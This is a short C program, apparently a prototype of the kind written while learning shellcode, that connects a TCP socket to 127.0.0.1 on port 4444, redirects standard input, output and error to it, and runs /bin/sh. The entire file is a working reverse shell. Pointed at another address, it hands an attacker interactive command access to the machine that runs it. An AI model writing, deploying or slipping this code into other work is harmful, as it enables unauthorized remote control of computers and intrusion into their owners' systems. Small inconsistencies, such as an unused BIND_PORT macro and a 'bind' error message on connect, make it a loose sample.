#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<strings.h>
#include<unistd.h>


#define BIND_PORT	4444


main(int argc, char **argv)
{
	int i, ret;
	int socketClient;

	char *args[] = { "/bin/sh", 0 };

	struct sockaddr_in server;
	int sockaddr_len = sizeof(struct sockaddr_in);

	// Create a socket
	socketClient = socket(AF_INET, SOCK_STREAM, 0);
	if (socketClient == -1)
	{
		exit(-1);
	}

	// Connect to the remote socket
	server.sin_family = AF_INET;
	server.sin_port = htons(4444);
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	bzero(&server.sin_zero, 8);

	ret = connect(socketClient, (struct sockaddr *) &server, sockaddr_len);
	if(ret == -1)
	{
		perror("bind : ");
		exit(-1);
	}


	// Duplicate file descriptors
	for (i=0; i<=2; i++)
	{
		dup2(socketClient, i);
	}

	// Execute /bin/sh
	execve(args[0], &args[0], NULL);
}
